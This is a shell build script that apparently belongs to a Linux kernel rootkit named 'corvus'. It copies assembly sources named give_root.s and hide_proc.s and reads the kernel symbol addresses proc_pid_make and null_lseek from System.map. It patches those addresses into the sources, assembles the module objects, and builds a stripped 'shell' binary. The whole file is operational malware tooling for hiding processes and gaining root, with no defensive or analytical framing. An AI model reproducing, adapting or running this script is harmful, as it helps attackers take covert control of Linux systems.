#!/bin/sh

VER=`uname -r`
mkdir -p $VER
cp -f corvus.s give_root.s hide_proc.s $VER/

PROC=`cat /boot/System.map-$VER | grep proc_pid_make | awk '{print \$1;}'`
ROOT=`cat /boot/System.map-$VER | grep null_lseek | awk '{print \$1;}'`

echo "proc_func_addr:  .long  0x$PROC" >> $VER/corvus.s
echo "root_func_addr:  .long  0x$ROOT" >> $VER/corvus.s
echo >> $VER/corvus.s
echo ".section .modinfo" >> $VER/corvus.s
echo ".string \"kernel_version=$VER\"" >> $VER/corvus.s
echo ".string \"license=GPL\"" >> $VER/corvus.s
tail -6 $VER/corvus.s >> $VER/give_root.s
tail -6 $VER/corvus.s >> $VER/hide_proc.s
# tail -6 $VER/corvus.s >> $VER/debug.s

cd $VER
as -o corvus.o corvus.s
as -o give_root.o give_root.s
as -o hide_proc.o hide_proc.s
# as -o debug.o debug.s

cd ../
as -o shell.o shell.s
ld -o shell shell.o
rm -f shell.o
strip shell
echo done